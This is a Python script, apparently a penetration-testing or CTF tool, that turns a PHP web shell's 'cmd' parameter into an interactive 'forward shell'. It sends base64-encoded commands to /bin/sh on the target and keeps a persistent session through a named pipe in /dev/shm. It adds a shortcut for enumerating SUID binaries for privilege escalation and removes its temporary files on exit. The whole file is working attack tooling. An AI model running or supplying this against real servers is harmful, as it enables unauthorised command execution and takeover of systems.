#!/usr/bin/env python3

import sys
import time
import signal
import requests
from colorama import Fore
from base64 import b64encode
from random import randrange

### Classes ###############################################################################################################

class ForwardShell:

    def __init__(self):
        session = randrange(1000, 9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
        self.help_options = {
            'enum suid': 'FileSystem SUID Privileges Enumeration', 
            'pseudoterminal': 'Executes a pseudoterminal',
            'exit': 'Exits the pseudoterminal',
            'help': 'Show this help panel'
        }
        self.is_pseudo_terminal = False

    def def_handler(self, sig, frame):
        print(f"\n\n{Fore.RED}[!] {Fore.YELLOW} Exiting the program... {Fore.RESET}\n")
        self.remove_data()
        sys.exit(1)

    def run_command(self, command):
        command = b64encode(command.encode()).decode()
        data = {'cmd': 'echo "%s" | base64 -d | /bin/sh' % command}

        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text

        except: 
            pass

        return None

    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()
        data = {'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)}

        r = requests.get(self.main_url, params=data)

    def read_stdout(self):
        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.2)

        return output_command

    def setup_shell(self):
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)

    def remove_data(self):
        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_data_command)

    def clear_stdout(self):
        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)

    def run(self):
        print(f"\n{Fore.GREEN}[i] {Fore.CYAN}Executing: {Fore.RED} Forward Shell{Fore.RESET}\n")
        self.setup_shell()

        while True:
            command = input(f"{Fore.GREEN}>>> {Fore.WHITE}")

            if "script /dev/null -c bash" in command:
                print(f"\n{Fore.YELLOW}[+] {Fore.CYAN}Se ha iniciado una pseudoterminal {Fore.RESET}\n")
                self.is_pseudo_terminal = True

            if command.strip() == "enum suid":
                command = f"find / -perm -4000 2>/dev/null | xargs ls -l"

            if command.strip() == "help":
                print(f"{Fore.GREEN}[i] {Fore.CYAN}Help panel")

                for key, value in self.help_options.items():
                    print(f"\t{Fore.YELLOW}[{key}] - {Fore.CYAN}{value}\n")

                continue

            self.write_stdin(command + "\n")
            output_command = self.read_stdout()

            if command.strip() == "exit":
                print(f"\n{Fore.YELLOW}[-] {Fore.CYAN}Se ha salido de la pseudoterminal{Fore.RESET}\n")
                self.is_pseudo_terminal = False
                self.clear_stdout()
                continue

            if self.is_pseudo_terminal:
                lines = output_command.split('\n')

                cleared_output = ""

                if len(lines) == 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                elif len(lines) > 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])

                print(f"\n{cleared_output}\n")

            else:
                print(output_command)
            
            self.clear_stdout()

def main():
    shell = ForwardShell()
    signal.signal(signal.SIGINT, shell.def_handler)
    shell.run()

if __name__ == "__main__":
    main()
